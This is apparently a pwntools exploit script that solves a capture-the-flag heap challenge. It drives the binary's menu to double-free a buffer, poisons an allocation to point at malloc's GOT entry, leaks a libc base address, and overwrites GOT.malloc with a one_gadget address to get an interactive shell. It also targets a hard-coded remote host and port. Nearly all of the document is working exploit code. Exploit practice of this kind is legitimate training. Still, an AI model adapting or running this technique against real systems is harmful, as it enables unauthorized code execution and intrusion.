#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
  if args.GDB:
    context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
    return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
  elif args.REMOTE:
    return remote('34.159.7.96', 32552, *a, **kw) 
  else:
    return process([exe] + argv, *a, **kw)
gs = '''
init-pwndbg
# start
# b *0x400954
b *0x40095e
continue
'''.format(**locals())


exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

def mallocPtr():
  io.sendline(b'1')

def mallocBuf(data):
  io.sendline(b'2')
  io.sendafter(b' name: ', data)

def callPtr_8():
  io.sendline(b'3')

def editBuf(data):
  io.sendline(b'4')
  io.sendafter(b' name: ', data)

def readBuf():
  io.sendline(b'5')

def freePtr():
  io.sendline(b'6')

def freeBuf():
  io.sendline(b'7')

malloc_libc_offset = libc.sym.malloc

io = start()

mallocPtr()
mallocBuf(b'b'*0x10)


# ptr->buf
freeBuf()
freePtr()
freeBuf()

mallocBuf(p64(elf.got.malloc))

mallocPtr()
mallocPtr()

mallocBuf(b'\n')

readBuf()

io.recvuntil(b' name is \n')
try:
  libc.address = ((u64(io.recvline()[:5].ljust(8, b"\x00"))<< 8) ^ 0x70) - malloc_libc_offset
except:
  print('try again!')
  io.close()
print(hex(libc.address))
if((libc.address >> 44) != 0x7):
  print('try again!')
  io.close()

# overwirte GOT.malloc w/ one_gadget
editBuf(p64(libc.address + 0x10a38c))
io.interactive()